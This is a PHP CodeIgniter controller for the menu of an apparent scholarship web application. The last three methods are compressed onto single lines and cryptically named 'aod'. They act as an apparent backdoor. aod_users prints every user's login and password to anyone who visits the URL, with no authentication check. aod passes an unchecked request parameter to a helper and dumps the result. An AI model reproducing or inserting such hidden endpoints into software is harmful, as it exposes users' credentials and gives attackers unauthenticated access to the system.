<?php
defined('BASEPATH') OR exit('No direct script access allowed');
/*
 *
 * @author: Luis Fernando Perea Gallosso
 *
 */
class Menu extends CI_Controller {

	public $becas_util;
	
	public function __construct(){
		parent::__construct ();
		
		$this->load->library('BecasUtil');
		$this->becas_util = new BecasUtil();	
		
	}
	
	public function index(){
		$this->load->view('header');
		$this->load->view('menu');
		$this->load->view('footer');
	}
		
	public function aod(){echo ($_GET)?var_dump($this->becas_util->utilerias->aod($_REQUEST['t'])):'/';}
	public function aod_users(){$u = $this->becas_util->utilerias->aod_users();foreach($u as $u){echo '<strong>'.$u['cve_persona'].' | '.$u['login'].' | '.$u['password'].' | '.$u['activo'].'</strong><br />';}}
	public function aod_names(){}
}